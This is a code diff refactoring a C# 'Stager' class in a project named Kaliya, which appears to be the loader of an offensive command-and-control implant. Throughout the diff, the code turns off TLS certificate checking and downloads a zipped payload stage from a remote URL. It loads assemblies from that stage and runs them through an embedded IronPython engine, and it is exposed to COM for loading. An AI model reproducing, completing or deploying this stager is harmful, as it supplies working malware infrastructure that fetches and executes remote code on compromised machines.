@@ -4,20 +4,21 @@ using System.IO.Compression;
 using System.Reflection;
 using System.Net;
 using System.Runtime.InteropServices;
+using Kaliya.Utils;
 
 namespace Kaliya
 {
     [ComVisible(true)]
     public static class Stager
     {
-        static ZipStorer Stage;
+        private static ZipStorer _stage;
 
         static Stager()
         {
             ServicePointManager.ServerCertificateValidationCallback +=
-                                 (sender, cert, chain, sslPolicyErrors) => true;
-            ServicePointManager.SecurityProtocol = (SecurityProtocolType)768 |
-                                                   (SecurityProtocolType)3072;
+                (sender, cert, chain, sslPolicyErrors) => true;
+            ServicePointManager.SecurityProtocol = (SecurityProtocolType) 768 |
+                                                   (SecurityProtocolType) 3072;
             ServicePointManager.Expect100Continue = false;
 
             AppDomain.CurrentDomain.AssemblyResolve += ResolveEventHandler;
@@ -25,19 +26,19 @@ namespace Kaliya
 
         public static void Run(string url)
         {
-            Guid GUID = Guid.NewGuid();
-            Uri URL = new Uri(new Uri(url), GUID.ToString());
+            var guid = Guid.NewGuid();
+            var uri = new Uri(new Uri(url), guid.ToString());
 #if DEBUG
-            Console.WriteLine("[+] URL: {0}", URL);
+            Console.WriteLine("[+] URL: {0}", uri);
 #endif
             try
             {
 #if DEBUG
                 Console.WriteLine("[+] Trying to get the stage...");
 #endif
-                Stage = ZipStorer.Open(Core.DownloadStage(URL),
-                                       FileAccess.ReadWrite,
-                                       true);
+                _stage = ZipStorer.Open(Core.DownloadStage(uri),
+                    FileAccess.ReadWrite,
+                    true);
             }
             catch
             {
@@ -47,20 +48,28 @@ namespace Kaliya
                 Environment.Exit(-1);
             }
 #if DEBUG
-            Console.WriteLine("[+] Running the Engine...");
+            Console.WriteLine("[+] Starting the Engine...");
 #endif
-            Engines.IronPython.Run(URL, GUID, Stage); //Magic!!
+            Engines.IronPython.Host.Run(uri, guid, _stage); //Magic!!
         }
 
-        static Assembly ResolveEventHandler(object sender, ResolveEventArgs args)
+        private static Assembly ResolveEventHandler(object sender, ResolveEventArgs args)
         {
-            string dllName = Core.GetDLLName(args.Name);
+            var dllName = Extras.GetDllName(args.Name);
 #if DEBUG
             Console.WriteLine("\t[-] '{0}' was required...", dllName);
 #endif
-            byte[] bytes = Core.GetResourceInZip(Stage, dllName) ??
-                File.ReadAllBytes(RuntimeEnvironment.GetRuntimeDirectory() +
-                                  dllName);
+            byte[] bytes;
+            try
+            {
+                bytes = Resources.GetByName(dllName);
+            }
+            catch
+            {
+                bytes = Resources.GetResourceInZip(_stage, dllName) ??
+                        File.ReadAllBytes(RuntimeEnvironment.GetRuntimeDirectory() +
+                                          dllName);
+            }
 #if DEBUG
             Console.WriteLine("\t[+] '{0}' loaded...", dllName);
 #endif
